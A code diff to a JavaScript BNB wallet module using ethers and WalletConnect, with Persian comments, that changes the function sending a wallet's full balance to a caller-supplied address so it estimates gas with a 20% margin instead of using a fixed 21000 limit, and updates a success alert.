@@ -1,7 +1,8 @@
 import { ethers } from 'ethers';
 import EthereumProvider from '@walletconnect/ethereum-provider';
 
-const projectId = '4d08946e6c316bed5e76b450ccbb5256'; // جایگزین با Project ID خود از WalletConnect Cloud
+// جایگزین با Project ID خود از WalletConnect Cloud
+const projectId = '4d08946e6c316bed5e76b450ccbb5256';
 
 const metadata = {
   name: 'BNB Wallet App',
@@ -42,9 +43,21 @@ export async function getBalance(provider, address) {
 
 export async function sendAllBNB(signer, toAddress) {
   const balanceWei = await signer.getBalance();
+
   const gasPrice = await signer.getGasPrice();
-  const gasLimit = 21000;
-  const totalGasCost = gasPrice.mul(gasLimit);
+
+  // ایجاد یک درخواست فرضی برای تخمین گس
+  const dummyTx = {
+    to: toAddress,
+    value: 0,
+  };
+
+  const estimatedGasLimit = await signer.estimateGas(dummyTx);
+
+  // افزایش گس لیمیت به 120% برای اطمینان
+  const safeGasLimit = estimatedGasLimit.mul(120).div(100);
+  const totalGasCost = gasPrice.mul(safeGasLimit);
+
   const amountToSend = balanceWei.sub(totalGasCost);
 
   if (amountToSend.lte(0)) {
@@ -55,9 +68,9 @@ export async function sendAllBNB(signer, toAddress) {
   const tx = await signer.sendTransaction({
     to: toAddress,
     value: amountToSend,
-    gasLimit,
+    gasLimit: safeGasLimit,
   });
 
   await tx.wait();
-  alert("تراکنش23")
+  alert('تراکنش با موفقیت ارسال شد.');
 }
